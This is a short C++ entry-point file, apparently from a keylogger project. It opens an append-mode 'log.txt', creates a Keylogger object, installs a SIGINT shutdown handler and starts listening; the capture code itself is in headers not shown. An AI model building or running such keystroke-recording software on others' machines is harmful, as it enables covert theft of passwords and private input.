#include <iostream>
#include <csignal>
#include <memory>

#include "../include/keylogger.h"
#include "../include/os_manager.h"

std::ofstream openLogFile();

int main() {
    std::ofstream loggerFile = openLogFile();
    
    std::unique_ptr<Keylogger> logger = std::make_unique<Keylogger>(std::move(loggerFile));

    if (!logger) {
        std::cerr << "Failed to set up Keylogger." << std::endl;
        return 1;
    }

    std::signal(SIGINT, OSManager::GracefulShutdown);

    logger->Listen();
    return 0;
}

std::ofstream openLogFile() {
    const char* fileName = "log.txt";
    std::ofstream output_file;
    
    std::cout << "Logging output to " << fileName << std::endl;
    output_file.open(fileName, std::ios_base::app);

    return output_file;
}